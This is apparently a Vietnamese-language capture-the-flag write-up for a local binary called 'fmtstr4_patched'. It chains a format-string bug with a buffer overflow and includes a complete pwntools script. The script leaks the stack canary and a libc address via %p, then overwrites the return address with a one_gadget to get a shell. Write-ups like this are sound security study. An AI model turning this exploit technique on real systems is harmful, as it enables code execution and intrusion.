# Format String + BOF


**ida:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/521c0109-5ffa-4c19-bd00-2ccea83473bf)


hmm nhìn sơ qua thì ta thấy có 2 lỗi là **fmtstr** ở hàm **printf id với password** và **bof ở hàm read** nhập cho secret

**checks và vm:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/fe11b8f9-86ba-4070-9cce-f48b33b232ec)


hmm tại đây ta thấy có **canary** ngăn ta khai thác lỗi **BOF**, nên việc đầu tiên ta phải leak được **canary** trước

đọc **ida** thì ta thấy ta cần nhập đúng 11byte cho **id** là **01234456789** và **password** là **&WPAbC&M!%8S5X#W**


![image](https://github.com/gookoosss/CTF.-/assets/128712571/720f7a28-66be-4455-bc78-5b0537e6162c)



tại hàm **printf** của id thì **ta sẽ lợi dụng lỗi fmtstr bằng cách dùng %p để leak ra canary** vì canary nằm trên stack trước rbp như trên ảnh

**oke sau khi leak đươc canary rồi thì ta thoải mái chạy đến rip , debug mãi thì thấy bài này làm ret2libc là hiểu quả nhất** 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/52426fc0-5344-42e5-9fd6-b1deec719981)



tại rip thì thấy có trỏ đến 1 địa chỉ libc nào đó, **ta sẽ tiếp tục lợi dụng lỗi fmtstr bằng %p lần nữa để leak địa chỉ này từ đó tính được địa chỉ base của libc** 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/dc2afc81-ee93-4bfa-9378-382b4cc6d893)

xong bước 1 rồi nè, h bước 2 ta tìm **one gadget** nữa là xong

***note:***

à tại đây ta cần biết thêm **1 kiến thức mới** nữa là **one_gadget**, hiểu đơn giản **one_gadget** trong file libc **là 1 cái offset trỏ đến shellcode mà chứa đầy đủ các thứ ta cần , rất đơn giản và nhanh chóng, tiện lợi**(hạn chế là không phải bài nào cũng dùng được)

![image](https://github.com/gookoosss/CTF.-/assets/128712571/2b0f23ee-841d-43b0-b520-72f2f2365841)

thử từng cái thì chọn cái thứ 2 là đúng :))

**script:**

```
#!/usr/bin/env python3

from pwn import *

p = process('./fmtstr4_patched')
exe = ELF("./fmtstr4_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

gdb.attach(p, gdbscript = '''
b*main+354
b*main+383

c
''')

input()

# leak canary and libc 

payload = b'01234456789' #id
payload += b'%21$p%23$p' #password

p.sendafter(b'ID: ', payload)
p.sendafter(b'Password: ',b'&WPAbC&M!%8S5X#W')

p.recvuntil(b'01234456789')
datas = p.recvuntil(b'Enter', drop = True).split(b'0x') # nhận canary và libc leak ra
canary = int(datas[1], 16)
libc_leak = int(datas[2], 16)
libc.address = libc_leak - 0x24083 # libc base 

log.info("Canary: " + hex(canary))
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

one_gadget = libc.address + 0xe3b01


payload = b'a'*0x38 + p64(canary) + p64(0) + p64(one_gadget)
p.sendafter(b'secret: ', payload )



p.interactive()

```

**ra rồi nè hehe**



![image](https://github.com/gookoosss/CTF.-/assets/128712571/aa1c33a3-c2cf-4730-ac20-ed332b5daa18)

